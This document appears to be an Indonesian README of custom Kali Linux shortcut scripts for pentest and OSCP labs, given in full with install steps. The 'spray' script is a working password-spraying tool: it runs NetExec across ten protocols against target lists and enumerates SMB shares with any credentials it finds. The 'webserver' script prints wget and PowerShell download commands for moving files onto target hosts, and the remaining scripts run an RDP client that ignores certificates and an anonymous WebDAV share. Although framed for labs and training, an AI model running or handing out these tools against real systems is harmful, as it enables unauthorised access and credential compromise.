# ⚙️ Custom Commands (Kali Linux)

Kumpulan shortcut untuk mempercepat workflow pentest / OSCP.

---

## 1. webserver

**Deskripsi:** HTTP server + auto generate wget & PowerShell (IWR)

### Setup
```bash
sudo nano /usr/local/bin/webserver
sudo chmod +x /usr/local/bin/webserver
```

### Script
```bash
#!/bin/bash

PORT=${1:-8000}

echo "[+] Starting web server on port $PORT..."
echo

FILES=$(ls -p | grep -v /)

echo "[+] Available download commands:"
echo

ip -4 -o addr show | awk '!/ lo / {
    split($4,a,"/");
    print $2 " (" a[1] "):"
}' | while read line; do

    IFACE=$(echo $line | awk '{print $1}')
    IP=$(echo $line | awk -F'[()]' '{print $2}')

    echo "$IFACE:"
    
    for f in $FILES; do
        echo "  wget http://$IP:$PORT/$f"
        echo "  iwr -uri http://$IP:$PORT/$f -Outfile $f"
    done

    echo
done

echo "[+] Serving files from: $(pwd)"
echo "----------------------------------------"

python3 -m http.server "$PORT" --bind 0.0.0.0
```

### Usage
```bash
webserver 80
```

---

## 2. rdp

**Deskripsi:** Shortcut cepat untuk koneksi RDP (xfreerdp)

### Setup
```bash
sudo nano /usr/local/bin/rdp
sudo chmod +x /usr/local/bin/rdp
```

### Script
```bash
#!/bin/bash

IP=$1
USER=${2:-Administrator}
PASS=$3

if [ -z "$IP" ]; then
    echo "Usage: rdp <ip> [user] [pass]"
    exit 1
fi

if [ -z "$PASS" ]; then
    read -s -p "Password: " PASS
    echo
fi

xfreerdp /v:$IP /u:$USER /p:"$PASS" /dynamic-resolution /cert:ignore +clipboard /timeout:5000 || echo "[!] Connection failed"
```

### Usage
```bash
rdp 192.168.50.250
rdp 192.168.50.250 offsec lab
```

### Info
- Default user: `Administrator`
- Password hidden saat input
- Clipboard aktif
- Cert: ignore (lab friendly)

---

## 3. spray

**Deskripsi:** Shortcut cepat untuk spray user password ke list target (net exec / nxc)

### Setup
```bash
sudo nano /usr/local/bin/spray
sudo chmod +x /usr/local/bin/spray
```

### Script
```bash
#!/bin/bash

# ===============================
# spray v4 - Stable & OSCP-safe NetExec Sprayer
# ===============================

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_spray.txt"
CLEAN_OUT="$OUTDIR/clean_spray.txt"
SMB_OUT="$OUTDIR/smb_spray.txt"

# OSCP-safe config
THREADS=1

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "nfs" "ldap")

# ===============================
# HELP
# ===============================
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "spray v4 - Hardened password spraying (NetExec)"
    echo
    echo "Usage:"
    echo "  spray [target] [user] [pass]"
    echo
    echo "Default:"
    echo "  spray (uses: target user pass)"
    echo
    echo "Output:"
    echo "  spray_netexec/"
    echo "    ├── raw_spray.txt"
    echo "    ├── clean_spray.txt"
    echo "    └── smb_spray.txt"
    echo
    echo "Safe mode:"
    echo "  Threads : $THREADS"
    exit 0
fi

# ===============================
# CHECK DEPENDENCY
# ===============================
command -v nxc >/dev/null || { echo "[!] nxc not found"; exit 1; }

# ===============================
# CHECK FILE
# ===============================
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [ -f "$f" ] || { echo "[!] Missing file: $f"; exit 1; }
done

# ===============================
# INIT OUTPUT
# ===============================
mkdir -p "$OUTDIR"
> "$RAW_OUT"
> "$CLEAN_OUT"
> "$SMB_OUT"

TARGETS=$(tr '\n' ' ' < "$TARGET_FILE")

echo "[+] Targets : $TARGET_FILE"
echo "[+] Users   : $USER_FILE"
echo "[+] Password: $PASS_FILE"
echo "[+] Output  : $OUTDIR"
echo

# ===============================
# SPRAY LOOP
# ===============================
for proto in "${PROTOCOLS[@]}"; do
    echo "========================================"
    echo "[+] Trying protocol: $proto"
    echo "========================================"

    TMP_OUT=$(mktemp)

    nxc $proto $TARGETS \
        -u "$USER_FILE" \
        -p "$PASS_FILE" \
        --threads $THREADS \
        --continue-on-success \
        --no-progress 2>/dev/null | tee "$TMP_OUT"

    # Save RAW
    cat "$TMP_OUT" >> "$RAW_OUT"

    # Save SUCCESS ONLY
    grep -i "\[+\]" "$TMP_OUT" >> "$CLEAN_OUT"

    # ===============================
    # OPTIONAL: STOP IF LOCKOUT DETECTED
    # ===============================
    if grep -q "STATUS_ACCOUNT_LOCKED_OUT" "$TMP_OUT"; then
        echo "[!] Detected account lockout! Stopping spray..."
        rm -f "$TMP_OUT"
        exit 1
    fi

    # ===============================
    # SMB AUTO ENUM (FIXED PARSING)
    # ===============================
    if [[ "$proto" == "smb" ]]; then
        echo "[+] Checking valid SMB creds..."
        grep -i "\[+\]" "$TMP_OUT" | while read -r line; do

        IP=$(echo "$line" | awk '{print $2}')

        CREDS=$(echo "$line" | grep -oP '(?<=\[\+\] ).*')

        USER_PART=$(echo "$CREDS" | awk -F':' '{print $1}')
        PASS=$(echo "$CREDS" | awk -F':' '{print $2}')

        if [[ "$USER_PART" == *\\* ]]; then
            DOMAIN=$(echo "$USER_PART" | awk -F'\\' '{print $1}')
            USER=$(echo "$USER_PART" | awk -F'\\' '{print $2}')
        else
            DOMAIN=""
            USER="$USER_PART"
        fi
        
        if [[ -z "$USER" || -z "$PASS" ]]; then
            echo "[!] Parse failed: $line"
            continue
    fi

    echo "[+] SMB ENUM: $IP | $USER:$PASS"

    if [[ -n "$DOMAIN" ]]; then
        nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
    else
        nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
    fi

   done

    fi

    rm -f "$TMP_OUT"
    echo
done

echo "[+] Done!"
echo "[+] Raw   : $RAW_OUT"
echo "[+] Clean : $CLEAN_OUT"
echo "[+] SMB   : $SMB_OUT"
```

### Usage
```bash
spray
spray listip user.txt pass.txt
```

### Info
- Default if running without parameter spray = spray target user pass

---

## 4. webdav

**Deskripsi:** Shortcut cepat untuk running webdav (wsgidav)

### Setup
```bash
sudo nano /usr/local/bin/webdav
sudo chmod +x /usr/local/bin/webdav
```

### Script
```bash
#!/bin/bash

# Default values
DIR="/tmp/wsgidav"
PORT="80"

# Help menu
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "Usage: webdav [directory] [port]"
    echo ""
    echo "Examples:"
    echo "  webdav                     # default /tmp/wsgidav port 80"
    echo "  webdav /tmp/share          # custom directory"
    echo "  webdav /tmp/share 8080     # custom directory + port"
    exit 0
fi

# Arguments
[[ -n "$1" ]] && DIR="$1"
[[ -n "$2" ]] && PORT="$2"

# Create directory if not exists
if [[ ! -d "$DIR" ]]; then
    echo "[+] Creating directory: $DIR"
    mkdir -p "$DIR"
fi

# Get IP
IP=$(hostname -I | awk '{print $1}')

# Banner
echo "[+] WebDAV Server Starting"
echo "[+] Root : $DIR"
echo "[+] Port : $PORT"
echo "[+] URL  : http://$IP:$PORT/"
echo ""

# Run WebDAV
wsgidav --host=0.0.0.0 --port="$PORT" --root="$DIR" --auth=anonymous


```

### Usage
```bash
webdav (Default /tmp/webdav port 80)
webdav /home/kali/share 8080 (Custom folder + port)
```

---

